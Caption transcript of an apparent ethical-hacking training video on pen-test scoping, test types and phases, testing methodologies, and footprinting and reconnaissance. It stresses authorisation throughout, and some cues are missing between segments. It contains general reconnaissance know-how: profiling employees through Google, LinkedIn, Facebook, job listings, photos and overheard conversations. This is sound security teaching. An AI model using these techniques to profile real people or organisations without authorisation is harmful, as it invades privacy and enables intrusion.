and\n\n312\n00:15:36.150 --> 00:15:36.770\ntake it down.\n\n313\n00:15:36.770 --> 00:15:39.650\nIn which case you would\nessentially create a catastrophic\n\n314\n00:15:39.650 --> 00:15:43.460\ndisaster recovery capable event,\nright, with in the organization.\n\n315\n00:15:43.460 --> 00:15:44.170\nThat's not,\n\n316\n00:15:44.170 --> 00:15:49.000\nlet me be clear, not the outcome that we\nare looking for with authorized pen tests.\n\n317\n00:15:49.000 --> 00:15:52.120\nThat is what hackers do when they\nbreak in without any permission,\n\n318\n00:15:52.120 --> 00:15:53.077\nseeking to do harm.\n\n319\n00:15:53.077 --> 00:15:57.204\nThat is not what certified ethical hackers\ndo when they're engaged in authorized\n\n320\n00:15:57.204 --> 00:15:57.930\nactivities.\n\n321\n00:15:57.930 --> 00:15:58.953\nQuite the opposite.\n\n322\n00:15:58.953 --> 00:16:01.508\nIf you do that,\nyou're not doing your job correctly.\n\n323\n00:16:01.508 --> 00:16:03.194\nAnd you're not following the rules.\n\n324\n00:16:03.194 --> 00:16:07.283\nSo even in a black box test we must,\nwithout exception,\n\n325\n00:16:07.283 --> 00:16:10.010\nalways have a statement of work.\n\n326\n00:16:10.010 --> 00:16:13.330\nA scope document,\nto use project management speak,\n\n327\n00:16:13.330 --> 00:16:16.920\nthat lays out unequivocally for\nus what systems are allowed and\n\n328\n00:16:16.920 --> 00:16:20.790\nwhat systems are not allowed or\nwhat are in scope and what is outer scope.\n\n329\n00:16:20.790 --> 00:16:24.400\nEven when we have no knowledge, we're\nstill told, hey, anything in this part of\n\n330\n00:16:24.400 --> 00:16:28.630\nthe network or anything in this subnet or\nanything that begins with this prefix.\n\n331\n00:16:28.630 --> 00:16:31.772\nYou're not allowed to touch, however you\npremise, lot of ways to give you that\n\n332\n00:16:31.772 --> 00:16:36.320\nknowledge w ithout exposing information\nthat makes it easier for you to hack.\n\n333\n00:16:36.320 --> 00:16:39.960\nBut you're basically told you can go\nafter this kind of system, nothing else.\n\n334\n00:16:39.960 --> 00:16:44.960\nNo domain controllers, no messaging\nsystems, only file and print data sources.\n\n335\n00:16:44.960 --> 00:16:46.150\nThat doesn't tell you anything.\n\n336\n00:16:46.150 --> 00:16:49.590\nIt just simply says, if you find\nanything else, it's off limits.\n\n337\n00:16:49.590 --> 00:16:50.660\nAnd that's really critical.\n\n338\n00:16:50.660 --> 00:16:52.720\nWe call that scoping and tailoring.\n\n339\n00:16:52.720 --> 00:16:54.380\nAnd you must have that knowledge.\n\n340\n00:16:54.380 --> 00:16:58.060\nOtherwise, you can't effectively do\nyour job in an authorized pen test,\n\n341\n00:16:58.060 --> 00:17:00.700\neven in a black box scenario,\nso be aware of that.\n\n342\n00:17:00.700 --> 00:17:04.460\nWe may think about it as a blind, or\na double blind, or a zero knowledge test.\n\n343\n00:17:04.460 --> 00:17:07.580\nThey're all essentially going\nto refer to similar activities.\n\n344\n00:17:07.580 --> 00:17:09.630\nYou're being given very\nlittle to no information,\n\n345\n00:17:09.630 --> 00:17:11.778\nand you then have to operate accordingly.\n\n346\n00:17:11.778 --> 00:17:12.730\nThat's where footprinting and\n\n347\n00:17:12.730 --> 00:17:16.180\nreconnaissance really starts to bare\nfruit because we have to go in,\n\n348\n00:17:16.180 --> 00:17:19.470\nas we showed you a little bit of,\nMike did a quick demonstration for\n\n349\n00:17:19.470 --> 00:17:23.060\nus, with regards to going out and\ndoing a DNS look up against who is and\n\n350\n00:17:23.060 --> 00:17:27.450\nmaybe I can database, and\nproviding some general information to us.\n\n351\n00:17:27.450 --> 00:17:30.450\nThose will be some of the very first\nsteps we're footprinting in recon.\n\n352\n00:17:30.450 --> 00:17:32.220\nWhere we would go out and\nlook for generally available.\n\n353\n00:17:33.340 --> 00:17:35.200\nPublicly available information.\n\n354\n00:17:35.200 --> 00:17:37.300\nWho belongs to that registration?\n\n355\n00:17:37.300 --> 00:17:38.140\nWho owns it?\n\n356\n00:17:38.140 --> 00:17:39.990\nWhat does it tell us about that system?\n\n357\n00:17:39.990 --> 00:17:41.400\nWhat's available via LinkedIn?\n\n358\n00:17:41.400 --> 00:17:42.480\nWhat's available via Google?\n\n359\n00:17:42.480 --> 00:17:46.232\nHave you ever Googled yourself to\nfind out what's out there about you?\n\n360\n00:17:46.232 --> 00:17:48.556\n>> [LAUGH]\n>> I apparently was a 12th century lord\n\n361\n00:17:48.556 --> 00:17:49.095\nin England.\n\n362\n00:17:49.095 --> 00:17:49.980\n>> That was nice.\n\n363\n00:17:49.980 --> 00:17:50.710\n>> Isn't that awesome?\n\n364\n00:17:50.710 --> 00:17:53.317\nI always knew I was important I\njust didn't know how important.\n\n365\n00:17:53.317 --> 00:17:55.840\n>> It's a royalty in [INAUDIBLE]\n>> Literally when I Google myself\n\n366\n00:17:55.840 --> 00:17:57.740\nI was Lord Gordon.\n\n367\n00:17:57.740 --> 00:17:58.470\n>> Nice.\n>> Yeah.\n\n368\n00:17:58.470 --> 00:17:59.370\n>> You got a coat of arms and everything.\n\n369\n00:17:59.370 --> 00:18:01.950\n>> I thought that was freaking\nawesome actually it was pretty cool.\n\n370\n00:18:01.950 --> 00:18:03.640\nSo I have a coat of arms.\n\n371\n00:18:03.640 --> 00:18:07.196\nActually all that stuff's out there,\nwasn't me of course but\n\n372\n00:18:07.196 --> 00:18:10.415\nsomebody with my name was a 12\ncentury lord in England or\n\n373\n00:18:10.415 --> 00:18:14.663\nback then in what was just Britain at\nthat point, it wasn't even England.\n\n374\n00:18:14.663 --> 00:18:16.170\nBut pretty interesting stuff.\n\n375\n00:18:16.170 --> 00:18:19.240\nThere's apparently a doctor out there\nthat's very well respected globally with\n\n376\n00:18:19.240 --> 00:18:20.550\nmy name, as well.\n\n377\n00:18:20.550 --> 00:18:22.554\nI should try to figure out\nhow to license that and\n\n378\n00:18:22.554 --> 00:18:25.075\nget a certain amount of royalties for\nmy name or something.\n\n379\n00:18:25.075 --> 00:18:25.870\nI don't know.\n\n380\n00:18:25.870 --> 00:18:27.900\nI mean you find all sorts\nof interesting stuff but\n\n381\n00:18:27.900 --> 00:18:32.070\nall kidding aside if you Google people in\na company, you will find out a lot of very\n\n382\n00:18:32.070 --> 00:18:34.900\nvaluable information about them with\nfootprinting and reconnaissance,\n\n383\n00:18:34.900 --> 00:18:38.610\nthat may help you to eventually do\nyour job and hack into that system.\n\n384\n00:18:38.610 --> 00:18:41.320\nAnd when I joke around about\nGoogling yourself, I'm not kidding.\n\n385\n00:18:41.320 --> 00:18:43.530\nGo out and Google those you work for.\n\n386\n00:18:43.530 --> 00:18:45.980\nSee whose got a profile\nout there in LinkedIn.\n\n387\n00:18:45.980 --> 00:18:48.770\nAre they talking about what they've\nbeen doing for project work lately?\n\n388\n00:18:48.770 --> 00:18:53.800\nThat's a lot of valuable information for\nsomebody like me to use against you.\n\n389\n00:18:53.800 --> 00:18:55.340\nAre they on Facebook?\n\n390\n00:18:55.340 --> 00:18:56.534\nProbably are unfortunately.\n\n391\n00:18:56.534 --> 00:18:57.853\nWhat are they doing?\n\n392\n00:18:57.853 --> 00:19:01.450\nDid they go out and do crazy stuff\nwith crazy people last weekend?\n\n393\n00:19:01.450 --> 00:19:02.760\nDid they write about it?\n\n394\n00:19:02.760 --> 00:19:06.005\nDid they put pictures up that may expose\ninformation about who they are and\n\n395\n00:19:06.005 --> 00:19:06.801\nwhere they work?\n\n396\n00:19:06.801 --> 00:19:10.314\nI love when people that work in highly\nsecured environments know better.\n\n397\n00:19:10.314 --> 00:19:14.830\nAnd I love that they know that\nthey shouldn’t do this stuff.\n\n398\n00:19:14.830 --> 00:19:16.900\nBut I love that they\nare just average people.\n\n399\n00:19:16.900 --> 00:19:19.740\nThey'll put up pictures of\nthemselves at work in front\n\n400\n00:19:19.740 --> 00:19:22.130\nof the computer rack in the data center.\n\n401\n00:19:22.130 --> 00:19:24.700\nLook, we just bought a new EMC San.\n\n402\n00:19:24.700 --> 00:19:27.806\nAwesome, I know you just spent\na million dollars on storage.\n\n403\n00:19:27.806 --> 00:19:31.670\nI also now know what kind of\nvulnerabilities your system may be subject\n\n404\n00:19:31.670 --> 00:19:33.590\nto because I can see what San you bought.\n\n405\n00:19:33.590 --> 00:19:35.390\nAnd I can look that up and go yeah.\n\n406\n00:19:35.390 --> 00:19:36.330\nThose five things,\n\n407\n00:19:36.330 --> 00:19:40.140\nif I do those things when I'm inside your\nnetwork, I own that storage of network.\n\n408\n00:19:40.140 --> 00:19:41.637\nThat's really not a good idea.\n\n409\n00:19:41.637 --> 00:19:44.650\nAnd we don't often stop and\nthink about this stuff.\n\n410\n00:19:44.650 --> 00:19:46.590\nMy wife, thankfully, right?\n\n411\n00:19:46.590 --> 00:19:47.530\nIs just so\n\n412\n00:19:47.530 --> 00:19:53.040\nhyper focused on this with the kids\nbecause she just goes nuts to her critic.\n\n413\n00:19:53.040 --> 00:19:55.120\nWhen anybody post\na picture of the kids and\n\n414\n00:19:55.120 --> 00:19:58.040\nyou tried to tag them in the picture and\nsay, this is so and so.\n\n415\n00:19:58.040 --> 00:19:59.010\nThis is so and so.\n\n416\n00:19:59.010 --> 00:20:00.468\nShe hates that.\n\n417\n00:20:00.468 --> 00:20:03.930\nHer sister tries to do that sometimes,\nshe gets on the phone and screams.\n\n418\n00:20:03.930 --> 00:20:05.820\nDon't put the kids up on Facebook.\n\n419\n00:20:05.820 --> 00:20:09.250\nAnd my wife's family,\ngot family all over the world.\n\n420\n00:20:09.250 --> 00:20:12.690\nI mean like hundreds of relatives,\nlarge extended family.\n\n421\n00:20:12.690 --> 00:20:15.580\nAnd they do this stuff all the time and\npeople don't think.\n\n422\n00:20:15.580 --> 00:20:16.880\nI do this for a living.\n\n423\n00:20:16.880 --> 00:20:18.810\nI don't really do this kind of stuff.\n\n424\n00:20:18.810 --> 00:20:20.200\nThis is not what I do.\n\n425\n00:20:20.200 --> 00:20:22.580\nBut I understand the importance of it.\n\n426\n00:20:22.580 --> 00:20:25.570\nExtrapolate that out to all the other\ninformation we're talking about.\n\n427\n00:20:25.570 --> 00:20:30.130\nThink about the things you give away every\nday about you when people ask for stuff.\n\n428\n00:20:30.130 --> 00:20:31.760\nI mean it is amazing.\n\n429\n00:20:31.760 --> 00:20:36.390\nAmazing, the amount of information that we\nallow to exist beyond our control today.\n\n430\n00:20:36.390 --> 00:20:39.080\nNot just as an individual but\nas a company.\n\n431\n00:20:39.080 --> 00:20:42.540\nGranted, publicly traded companies have\nto report a bunch of this stuff in\n\n432\n00:20:42.540 --> 00:20:43.640\nprospectuses.\n\n433\n00:20:43.640 --> 00:20:45.500\nIt's a great valuable resource.\n\n434\n00:20:45.500 --> 00:20:47.100\nFor investors, guess what?\n\n435\n00:20:47.100 --> 00:20:48.655\nIt's also awesome for hackers.\n\n436\n00:20:48.655 --> 00:20:50.560\n>> [LAUGH]\n>> We love looking at that stuff.\n\n437\n00:20:50.560 --> 00:20:51.950\nTells us the Board of Directors.\n\n438\n00:20:51.950 --> 00:20:54.930\nTells us all sorts a information\nabout your company.\n\n439\n00:20:54.930 --> 00:20:56.950\nIt's not any one thing by the way.\n\n440\n00:20:56.950 --> 00:20:58.722\nIt's the eating the elephant syndrome.\n\n441\n00:20:58.722 --> 00:21:02.460\nIt's all the stuff that I can\nfind that I aggregate together.\n\n442\n00:21:02.460 --> 00:21:04.020\nThat is what makes reconnaissance and\n\n443\n00:21:04.020 --> 00:21:08.510\nfootprinting such a powerful\napproach to profiling your network.\n\n444\n00:21:08.510 --> 00:21:12.840\nBecause it's the 25 little\npieces of information.\n\n445\n00:21:12.840 --> 00:21:16.090\nThat I can use and I can aggregate up.\n\n446\n00:21:16.090 --> 00:21:18.470\nAnd Ben in the comment, great point.\n\n447\n00:21:18.470 --> 00:21:21.423\nJob listings help you to find\nequipment type and resources and\n\n448\n00:21:21.423 --> 00:21:23.138\nskills companies are looking for.\n\n449\n00:21:23.138 --> 00:21:26.338\nIf you got a company out there looking for\nCisco engineers, you could tell a lot\n\n450\n00:21:26.338 --> 00:21:29.860\nabout the infrastructure they're running,\nas Ben's commenting in the chat room.\n\n451\n00:21:29.860 --> 00:21:31.300\nIt's a great observation.\n\n452\n00:21:31.300 --> 00:21:32.042\nAnd that's the kind\n\n453\n00:21:32.042 --> 00:21:34.274\nof thing you got to start thinking\nabout if you wanna be a CEH.\n\n454\n00:21:34.274 --> 00:21:36.700\nYou wanna be a certified ethical hacker.\n\n455\n00:21:36.700 --> 00:21:39.750\nThe most important thing I can teach you,\nI can tell you,\n\n456\n00:21:39.750 --> 00:21:44.000\nis you've got to learn to think like the\nbad guys that you're defending against.\n\n457\n00:21:44.000 --> 00:21:46.060\nIn order to become really good at this,\n\n458\n00:21:46.060 --> 00:21:48.860\nyou got to become really good\nat becoming a hacker first.\n\n459\n00:21:48.860 --> 00:21:51.200\nAnd then,\nthink how to be a good hacker second.\n\n460\n00:21:51.200 --> 00:21:55.630\nBecause when you learn how to be a hacker,\nyou learn to think in this way.\n\n461\n00:21:55.630 --> 00:21:58.710\nAnd I'm not talking about the mad hacking\nskills you need to be able to break past\n\n462\n00:21:58.710 --> 00:21:59.650\nthe firewall.\n\n463\n00:21:59.650 --> 00:22:01.350\nYou learn how to do that stuff.\n\n464\n00:22:01.350 --> 00:22:04.270\nWhether you use that for good or\nbad, it's the same set of skills.\n\n465\n00:22:04.270 --> 00:22:08.780\nI'm talking about learning the mindset,\nthe cultural integrity and the ethos.\n\n466\n00:22:08.780 --> 00:22:11.650\nOf the hacker is\nthe mindset of looking for\n\n467\n00:22:11.650 --> 00:22:15.210\nevery piece of information that\nthey can use to gain advantage.\n\n468\n00:22:15.210 --> 00:22:16.280\nAnd this is not a negative.\n\n469\n00:22:16.280 --> 00:22:18.570\nThis is just the reality of their world.\n\n470\n00:22:18.570 --> 00:22:23.640\nThey have to be this much better\nthan you to be able to get in.\n\n471\n00:22:23.640 --> 00:22:24.960\nThat's all they have to do,\n\n472\n00:22:24.960 --> 00:22:30.700\nfind one piece of information that you\nhaven't anticipated, prevented, or somehow\n\n473\n00:22:30.700 --> 00:22:35.068\nnullified through some sort of mitigation\ncontrol that they can use against you.\n\n474\n00:22:35.068 --> 00:22:38.100\nYour job is to be this\nmuch better than they are.\n\n475\n00:22:38.100 --> 00:22:39.660\nI'd just be one step ahead.\n\n476\n00:22:39.660 --> 00:22:40.970\nIt's a very simple game.\n\n477\n00:22:40.970 --> 00:22:44.650\nThe problem is, you need to be\nthis much better all the time.\n\n478\n00:22:44.650 --> 00:22:46.940\nThey just have to be\nthis much better once.\n\n479\n00:22:46.940 --> 00:22:49.450\nThat's the problem, and\nthat's the challenge.\n\n480\n00:22:49.450 --> 00:22:54.460\nAnd if you can start thinking like\nthey think, if you can start thinking\n\n481\n00:22:54.460 --> 00:22:57.810\nalong those lines, you're gonna be amazed\nat the amount of information that your\n\n482\n00:22:57.810 --> 00:23:01.500\ncompany gives out, the amount\nof information that's out there.\n\n483\n00:23:01.500 --> 00:23:06.150\nThe number of potential liabilities that\nexist that are on the web that can point\n\n484\n00:23:06.150 --> 00:23:10.600\npeople back to your front door and allow\nthem to kick it in if they choose to.\n\n485\n00:23:10.600 --> 00:23:11.720\nIt's just scary.\n\n486\n00:23:11.720 --> 00:23:13.350\nThe amount of information we give out.\n\n487\n00:23:13.350 --> 00:23:15.350\nBlack box hacking, no prior knowledge.\n\n488\n00:23:15.350 --> 00:23:17.740\nGray box hacking, limited knowledge.\n\n489\n00:23:17.740 --> 00:23:18.450\nSome knowledge.\n\n490\n00:23:18.450 --> 00:23:19.940\nWe're giving some information.\n\n491\n00:23:19.940 --> 00:23:21.330\nWhite box, complete knowledge.\n\n492\n00:23:21.330 --> 00:23:24.367\nYou're on the inside,\nyou're sitting in the.\n\n493\n00:23:24.367 --> 00:23:26.150\n[LAUGH] You're sitting there hooked up,\n\n494\n00:23:26.150 --> 00:23:29.296\nyou're having a cup of coffee with\nthe lead engineer and you say, hey,\n\n495\n00:23:29.296 --> 00:23:32.010\nlet's see if I can break\nin to that message server.\n\n496\n00:23:32.010 --> 00:23:34.390\nWhat's the name and address and\nwhat's the username?\n\n497\n00:23:34.390 --> 00:23:36.220\nAnd they give it to you and\nyou go break in.\n\n498\n00:23:36.220 --> 00:23:40.350\nYou're behind the firewall in a white box\ntest, very important to understand that.\n\n499\n00:23:40.350 --> 00:23:43.530\nOften commonly called the complete or\nfull knowledge exam or\n\n500\n00:23:43.530 --> 00:23:45.450\nfull knowledge pen test, as well.\n\n501\n00:23:45.450 --> 00:23:47.540\nJust make sure you're familiar with that.\n\n502\n00:23:47.540 --> 00:23:49.480\nSo just wanna know the different\nkinds of pen testing.\n\n503\n00:23:49.480 --> 00:23:53.139\nAgain, all part of the concept and\nthe discussion around footprinting and\n\n504\n00:23:53.139 --> 00:23:54.077\nreconnaissance.\n\n505\n00:23:54.077 --> 00:23:56.983\nWhat are the phases of pen\ntesting that we have to get into?\n\n506\n00:23:56.983 --> 00:24:00.035\nPre-attack phase, attack, and post-attack.\n\n507\n00:24:00.035 --> 00:24:01.102\nPretty straightforward.\n\n508\n00:24:01.102 --> 00:24:02.496\nWe're going to ramp up and get ready.\n\n509\n00:24:02.496 --> 00:24:04.237\nWe're going to do our business.\n\n510\n00:24:04.237 --> 00:24:06.315\nWe're going to celebrate afterwards,\nright?\n\n511\n00:24:06.315 --> 00:24:08.390\n>> Mm-hm.\n>> I mean that's really what we do, right?\n\n512\n00:24:08.390 --> 00:24:10.930\nBut remember, it's a school night so\nonly one beer, right?\n\n513\n00:24:10.930 --> 00:24:12.086\n>> [LAUGH]\n>> So pre attack phase,\n\n514\n00:24:12.086 --> 00:24:13.470\nwe're going to plan and prepare.\n\n515\n00:24:13.470 --> 00:24:17.210\nWe're going to design and think about all\nof the things that we may need, right,\n\n516\n00:24:17.210 --> 00:24:19.530\nwe're gonna go gather information,\nfoot printing and\n\n517\n00:24:19.530 --> 00:24:21.410\nreconnaissance becomes\nvery important there.\n\n518\n00:24:21.410 --> 00:24:24.760\nWe're gonna go out and actively attack,\nwe're gonna acquire the target,\n\n519\n00:24:24.760 --> 00:24:27.560\nwe're gonna assess the liability and\nvulnerabilities there,\n\n520\n00:24:27.560 --> 00:24:30.350\nwe're gonna break through,\nwe're gonna gain control.\n\n521\n00:24:30.350 --> 00:24:33.710\nAnd then post attack,\nwe're gonna port cleanup, and of course,\n\n522\n00:24:33.710 --> 00:24:37.020\ndestroy all the information\nthat is no longer pertinent.\n\n523\n00:24:37.020 --> 00:24:40.520\nWe're gonna remove any software,\nremote control things,\n\n524\n00:24:40.520 --> 00:24:43.080\nwhatever we may have left behind,\nin order to take advantage of that system.\n\n525\n00:24:43.080 --> 00:24:46.400\nWe're going to unconstruct in other words,\nour path ways in.\n\n526\n00:24:46.400 --> 00:24:50.040\nWe're going to patch up all of those holes\nto ensure they can't be used against us.\n\n527\n00:24:50.040 --> 00:24:52.740\nVery important to be deconstructing,\nright?\n\n528\n00:24:52.740 --> 00:24:53.660\nAll those entry ways.\n\n529\n00:24:53.660 --> 00:24:55.010\nWant to make sure we're aware of that.\n\n530\n00:24:56.090 --> 00:24:58.760\nWe've talked about a lot\nof different approaches.\n\n531\n00:24:58.760 --> 00:25:01.000\nNetwork assessment for\nvulnerability scanning.\n\n532\n00:25:01.000 --> 00:25:02.490\nWe've talked about band testing.\n\n533\n00:25:02.490 --> 00:25:07.050\nThere are methodologies out there as well,\nformal methodologies that can be used.\n\n534\n00:25:07.050 --> 00:25:08.600\nThere is, we haven't gone out and\n\n535\n00:25:08.600 --> 00:25:11.610\ntaken a look at the OS website yet, but I\nknow you had pulled it up at one point can\n\n536\n00:25:11.610 --> 00:25:13.057\nyou just pull it up while we're talking\n>> Mm-hm\n\n537\n00:25:13.057 --> 00:25:13.621\n>> real quick,\n\n538\n00:25:13.621 --> 00:25:15.248\nreal quick excuse me [LAUGH].\n\n539\n00:25:15.248 --> 00:25:17.800\nSo OWASP, for instance, Mike's gonna\ntake us out there in a minute,\n\n540\n00:25:17.800 --> 00:25:19.000\nwe'll take a look at that.\n\n541\n00:25:19.000 --> 00:25:26.350\nBut the OWASP website, the web\napplication security platform or security\n\n542\n00:25:26.350 --> 00:25:31.240\nwebsite that helps us to understand all of\nthe good things, the best practices and\n\n543\n00:25:31.240 --> 00:25:35.140\nthe thought processes that we, as security\nprofessionals, may want to engage in.\n\n544\n00:25:35.140 --> 00:25:39.240\nOWASP dot org, the Open Web Application\nSecurity Project is really,\n\n545\n00:25:39.240 --> 00:25:42.240\nreally important as a website,\nand a valuable tool for you.\n\n546\n00:25:42.240 --> 00:25:44.940\nYou may want to go out and\ntake a look, very helpful.\n\n547\n00:25:44.940 --> 00:25:45.740\nRight?\n>> Mm-hm\n\n548\n00:25:45.740 --> 00:25:46.920\n>> So think about OWASP.\n\n549\n00:25:46.920 --> 00:25:47.910\nThey have a lot of good stuff.\n\n550\n00:25:47.910 --> 00:25:49.660\nWe'll talk about some of\ntheir top ten lists and\n\n551\n00:25:49.660 --> 00:25:53.070\nsome various things later on as\nwe get into some discussions.\n\n552\n00:25:53.070 --> 00:25:57.390\nBut they as general, just like sans, just\nlike some of the other generic websites,\n\n553\n00:25:57.390 --> 00:26:01.000\nwe've talked up that are very valuable,\nthe CSA, called security alliance website,\n\n554\n00:26:01.000 --> 00:26:02.690\nthe PCID assess website.\n\n555\n00:26:02.690 --> 00:26:05.460\nAll these sites provide\ngreat guidance unbias,\n\n556\n00:26:05.460 --> 00:26:09.500\njust industry, best practices,\nand good common sense.\n\n557\n00:26:09.500 --> 00:26:11.690\nAnd that's one of the most\nimportant tools that a CEH,\n\n558\n00:26:11.690 --> 00:26:14.890\na certified ethical hacker,\ncan bring to bear in any conversation.\n\n559\n00:26:14.890 --> 00:26:15.550\nIt's common sense.\n\n560\n00:26:15.550 --> 00:26:16.490\nCuz that's really\n>> Mm-hm.\n\n561\n00:26:16.490 --> 00:26:18.470\n>> gonna be very important for\nus to think about that.\n\n562\n00:26:18.470 --> 00:26:19.990\nSo, there's OWASP.\n\n563\n00:26:19.990 --> 00:26:23.490\nThere may be the open source\nsecurity testing methodology manual,\n\n564\n00:26:23.490 --> 00:26:26.470\nwhats called OSSTMM.\n\n565\n00:26:26.470 --> 00:26:28.020\nOSSTMM.\n\n566\n00:26:28.020 --> 00:26:30.570\nYou may just Google for\nthat and you'll find that.\n\n567\n00:26:30.570 --> 00:26:33.870\nThere's also the information system\nsecurity assessment framework.\n\n568\n00:26:33.870 --> 00:26:34.730\nThe ISSAF.\n\n569\n00:26:34.730 --> 00:26:37.970\nThese are both open source projects or\n\n570\n00:26:37.970 --> 00:26:43.760\npeer reviewed methodologies that may also\nprovide guidance for security testing.\n\n571\n00:26:43.760 --> 00:26:44.817\nIt's bunch different ones.\n\n572\n00:26:44.817 --> 00:26:48.910\nEC Council has their own LPT,\nlicense pen testing methodology,\n\n573\n00:26:48.910 --> 00:26:53.240\nthat's kinda paired with lateral to see\neach that gives you very deep thoughts,\n\n574\n00:26:53.240 --> 00:26:55.910\nspecific guidance and\nfocus around PAN Testing.\n\n575\n00:26:55.910 --> 00:26:59.150\nSo, it's here, just another opportunity\nfor you to go take a look at\n\n576\n00:26:59.150 --> 00:27:03.660\nsome methodologies that may exist, but\nPAN testing is gonna be very important.\n\n577\n00:27:03.660 --> 00:27:06.290\nWe wanna be thinking about\nall the different places and\n\n578\n00:27:06.290 --> 00:27:10.680\nall the different ways that we may be\nable to go in, and gather information and\n\n579\n00:27:10.680 --> 00:27:12.940\nuse that information to our benefit.\n\n580\n00:27:12.940 --> 00:27:18.600\nWhen you think about it, everything from\na CCTV, a closed circuit TV camera to\n\n581\n00:27:18.600 --> 00:27:23.760\nthe log on a system to the visitor log,\n\n582\n00:27:23.760 --> 00:27:26.680\nthat somebody signs in at the desk\nwhen they come in to see you,\n\n583\n00:27:26.680 --> 00:27:29.360\nis all potentially information\nthat during footprinting and\n\n584\n00:27:29.360 --> 00:27:35.020\nreconnaissance, we may wanna grab and\nwe may want to

do.\n\n601\n00:28:17.990 --> 00:28:21.570\nSpend a lot of time on airplanes and\na lot of time to hotels, right?\n\n602\n00:28:21.570 --> 00:28:26.650\nAnd when I do,\nI don't travel with logo wear.\n\n603\n00:28:26.650 --> 00:28:28.800\nI don't wear, I work for\nMicrosoft on my chest.\n\n604\n00:28:28.800 --> 00:28:30.857\n>> [LAUGH]\n>> I don't wear, I work for, for\n\n605\n00:28:30.857

That's you.\n\n608\n00:28:36.089 --> 00:28:37.540\n>> [LAUGH]\n>> That you guys have\n\n609\n00:28:37.540 --> 00:28:39.230\nwith that new logo which you guys put up.\n\n610\n00:28:39.230 -->

knew IT Pro TV t-shirt.\n\n613\n00:28:45.561 --> 00:28:46.770\n>> [LAUGH]\n>> I knew that you'd like that one.\n\n614\n00:28:46.770 --> 00:28:47.966\n>> That's all.\nThat is a cool

airports.\n\n622\n00:29:01.810 --> 00:29:04.740\nAnd again, I get it, you work for\na company, you're at client meetings,\n\n623\n00:29:04.740 --> 00:29:05.580\nyou're moving between and\n\n624\n00:29:05.580 --> 00:29:08.940\nthe mandate is you wear a shirt, you're\nat a trade show, I get all this stuff.\n\n625\n00:29:08.940 --> 00:29:12.975\nBut then I also wonder, who's in

have to wonder about that\nbecause whoever's thinking\n\n631\n00:29:23.340 --> 00:29:27.730\nabout this stuff doesn't see it as\na threat, and it may not be but then again\n\n632\n00:29:27.730 --> 00:29:30.625\nthere's a lot of industrial espionage\nthat goes on in there very well may be.\n\n633\n00:29:30.625 --> 00:29:31.380\n>> Mm-hm.\n\n634\n00:29:31.380 --> 00:29:33.460\n>> I love when people sit down\nat the bar in an airport,\n\n635\n00:29:33.460 --> 00:29:36.230\nhave a couple of drinks getting\nready to go get on a flight and\n\n636\n00:29:36.230 --> 00:29:39.320\nthen start talking about what they do and\nwhere they do it.\n\n637\n00:29:39.320 --> 00:29:42.390\nWhether you want to hear it or\nnot by the way.\n\n638\n00:29:42.390 --> 00:29:43.680\n>> [LAUGH]\n>> And it's amazing\n\n639\n00:29:43.680 --> 00:29:47.690\nthe amount of information I find out when\nI'm in airports or I'm on a plane, or\n\n640\n00:29:47.690 --> 00:29:50.600\nI'm sitting in a hotel bar\ntrying to get work done.\n\n641\n00:29:50.600 --> 00:29:51.745\nCuz you know, you can work.\n\n642\n00:29:51.745 --> 00:29:53.209\nWork a lot in a bar.\n[CROSSTALK]\n\n643\n00:29:53.209 -->

primary\n\n652\n00:30:02.088 --> 00:30:04.990\nactivity I'm engaging in.\nBut the reality is.\n\n653\n00:30:04.990 --> 00:30:08.370\nI will often, when I'm traveling,\ngo sit down at the end of the day in\n\n654\n00:30:08.370 --> 00:30:12.270\nthe bar with my computer, five,\nten quiet minutes, have a drink and\n\n655\n00:30:12.270 --> 00:30:15.270\njust go over stuff and\nfinish up whatever I'm doing.\n\n656\n00:30:15.270 --> 00:30:16.380\nI'm not talking to anybody.\n\n657\n00:30:16.380 --> 00:30:17.870\nI'm not advertising what I'm there to do.\n\n658\n00:30:17.870 --> 00:30:19.450\nI'm just trying to get some work done.\n\n659\n00:30:19.450 --> 00:30:21.300\nBut I sit and listen to conversations.\n\n660\n00:30:21.300 --> 00:30:24.070\nYou would be amazed at\nthe amount of stuff I find out.\n\n661\n00:30:24.070 --> 00:30:26.080\nAnd again,\nif I was looking to get up to no good.\n\n662\n00:30:26.080 --> 00:30:27.361\nAnd also I've been to\nevery security show we've\n\n663\n00:30:27.361 --> 00:30:27.977\ndone,\n>> [LAUGH]\n\n664\n00:30:27.977 --> 00:30:29.553\n>> If I just wanted to trade on that\n\n665\n00:30:29.553 --> 00:30:33.132\ninformation, Mike and

over.\n\n670\n00:30:41.985 --> 00:30:43.605\nBecause I hear about IFPOs.\n\n671\n00:30:43.605 --> 00:30:46.930\nI hear about insider information,\nI hear about who's doing what to whom.\n\n672\n00:30:46.930 --> 00:30:49.400\nI hear about who's not doing what to whom,\nwhen they should be.\n\n673\n00:30:49.400 --> 00:30:51.660\nI hear about who's buying what.\n\n674\n00:30:51.660 --> 00:30:54.000\nIt's amazing the amount of\ninformation I hear about and\n\n675\n00:30:54.000 --> 00:30:56.180\nI see, when I sit on a plane\n>> Mm-hm.\n\n676\n00:30:56.180 --> 00:30:59.740\n>> and I'm sitting behind somebody and\nthey're working on their laptop working on\n\n677\n00:30:59.740 --> 00:31:04.310\nwho knows what and they don't have\na glare screen, as silly as that sounds.\n\n678\n00:31:04.310 --> 00:31:06.005\nIt's just commonplace\nas that would be today.\n\n679\n00:31:06.005 --> 00:31:08.000\n>> Right.\n>> I was teaching a class last week and\n\n680\n00:31:08.000 --> 00:31:09.010\nhad somebody in my class.\n\n681\n00:31:09.010 --> 00:31:10.170\nIt was the person in front of me.\n\n682\n00:31:10.170 --> 00:31:12.095\nI told you I had a split class,\nhalf online.\n\n683\n00:31:12.095 --> 00:31:15.160\n>> Uh-huh.\n>> He was sitting in front of me and\n\n684\n00:31:15.160 --> 00:31:19.930\nhe had a corporate owned asset, he was\nusing a laptop, and I gotta commend him,\n\n685\n00:31:19.930 --> 00:31:24.360\nhe was sitting there, he had a glare\nscreen on, and he was he had three people\n\n686\n00:31:24.360 --> 00:31:27.340\nbehind him in the road doing labs along\nwith him, he was sitting at the front.\n\n687\n00:31:27.340 --> 00:31:30.510\nHe angled his machine so that nobody could\nsee it, and he had the glare screen on so\n\n688\n00:31:30.510 --> 00:31:34.310\nthat even though all he was doing was just\nlab work in this VMware solution we were\n\n689\n00:31:34.310 --> 00:31:37.200\ndoing, he didn't want anybody to\ninadvertently see something because he\n\n690\n00:31:37.200 --> 00:31:39.920\nwas jumping into his own\nenvironment from time to time.\n\n691\n00:31:39.920 --> 00:31:41.010\nHe was doing the right 